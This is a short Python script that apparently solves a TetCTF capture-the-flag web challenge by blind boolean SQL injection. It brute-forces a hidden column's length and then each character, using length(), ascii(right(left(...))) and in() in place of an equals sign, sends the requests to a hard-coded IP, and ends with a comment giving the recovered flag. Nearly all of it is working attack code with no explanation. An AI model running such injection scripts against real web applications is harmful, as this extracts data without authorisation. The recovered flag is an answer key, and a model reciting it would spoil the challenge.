import requests

url = "http://45.77.255.164/?id="
flag_len, flag = 0, ""

def Flag_len():
	global flag_len
	for i in range(100):
		payload = "length(t_fl4g_v3lue_su)in({})".format(i)
		URL = url + payload
		res = requests.get(URL)
		if "handsome_flag" in res.text:
			flag_len = i
			print("[+] Flag Length is {}".format(i))
			break

def Flag():
	global flag
	for i in range(1, flag_len + 1):
		for j in range(35, 126):
			payload = "ascii(right(left(t_fl4g_v3lue_su,{}),1))in({})".format(i, j)
			URL = url + payload
			res = requests.get(URL)
			if "handsome_flag" in res.text:
				flag += chr(j)
				break
	print("Flag is {}".format(flag))

if __name__ == '__main__':
	print("[+] Exploitation ...")
	Flag_len()
	Flag()

# Output : TetCTF{_W3LlLlLlll_Pl44yYyYyyYY_<3_vina_*100*28904961445554#}
